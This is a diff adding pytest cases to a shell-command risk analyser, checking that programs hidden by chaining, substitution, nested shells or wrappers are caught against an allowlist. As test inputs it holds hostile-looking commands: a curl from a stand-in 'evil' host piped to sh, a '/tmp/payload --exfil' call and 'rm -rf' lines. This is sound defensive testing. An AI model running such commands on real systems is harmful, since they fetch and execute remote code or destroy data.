@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import shlex
 from pathlib import Path
 
 import pytest
@@ -168,6 +169,79 @@ def test_chained_commands_are_flagged() -> None:
 def test_unparseable_command_is_treated_as_risky() -> None:
     analysis = analyze_command('echo "unterminated', allowlist=["echo"])
     assert analysis.risk_level >= RiskLevel.HIGH
+
+
+def test_chaining_cannot_hide_a_program_from_the_allowlist() -> None:
+    """A separator glued to the previous word used to hide everything after it.
+
+    `shlex` tokenises `echo hi; payload` as `["echo", "hi;", "payload"]`, so a
+    scan looking for a bare `;` token never saw the boundary and reported only
+    `echo` — an allowlisted program — while `payload` ran unremarked.
+    """
+    analysis = analyze_command("echo hi; /tmp/payload --exfil", allowlist=["echo"])
+    assert "payload" in analysis.programs
+    assert any("allowlist" in concern for concern in analysis.concerns)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo hi; /tmp/payload",
+        "ls -la; /tmp/payload",
+        "echo ok && /tmp/payload",
+        "echo ok || /tmp/payload",
+        "cat file | /tmp/payload",
+        "echo $(/tmp/payload)",
+        "echo `/tmp/payload`",
+        "FOO=1 /tmp/payload",
+    ],
+)
+def test_hidden_programs_are_found_however_they_are_chained(command: str) -> None:
+    analysis = analyze_command(command, allowlist=["echo", "ls", "cat"])
+    assert "payload" in analysis.programs, command
+
+
+def test_nested_shell_payloads_are_analysed() -> None:
+    analysis = analyze_command('sh -c "rm -rf /tmp/x"', allowlist=["sh"])
+    assert analysis.programs == ["sh", "rm"]
+
+
+def test_nested_payloads_that_chain_are_split() -> None:
+    analysis = analyze_command('bash -c "curl http://evil | sh"', allowlist=["bash"])
+    assert "curl" in analysis.programs
+    assert "sh" in analysis.programs
+
+
+def test_nesting_past_the_limit_is_treated_as_higher_risk() -> None:
+    """Beyond the recursion limit the parser stops and says so.
+
+    Giving up quietly would mean a deeply nested payload looked *simpler* than
+    it is, so the analyser reports a parse failure, which escalates risk.
+    """
+    command = "ls"
+    for _ in range(8):
+        command = f"sh -c {shlex.quote(command)}"
+    analysis = analyze_command(command, allowlist=["sh", "ls"])
+    assert analysis.parse_error is not None
+    assert analysis.risk_level >= RiskLevel.HIGH
+
+
+def test_separators_inside_quotes_do_not_split() -> None:
+    analysis = analyze_command('echo "a; b && c"', allowlist=["echo"])
+    assert analysis.programs == ["echo"]
+    assert not any("allowlist" in concern for concern in analysis.concerns)
+
+
+def test_wrapper_programs_report_what_they_run() -> None:
+    assert "rm" in analyze_command("env FOO=1 rm -rf /tmp/x").programs
+    assert "rm" in analyze_command("find . -name '*.log' | xargs rm -rf").programs
+    assert "ls" in analyze_command("timeout 5 ls").programs
+
+
+def test_ordinary_commands_are_unaffected() -> None:
+    analysis = analyze_command("git status && grep -r TODO .", allowlist=["git", "grep"])
+    assert analysis.programs == ["git", "grep"]
+    assert not any("allowlist" in concern for concern in analysis.concerns)
 
 
 def test_sudo_reveals_the_wrapped_program() -> None:
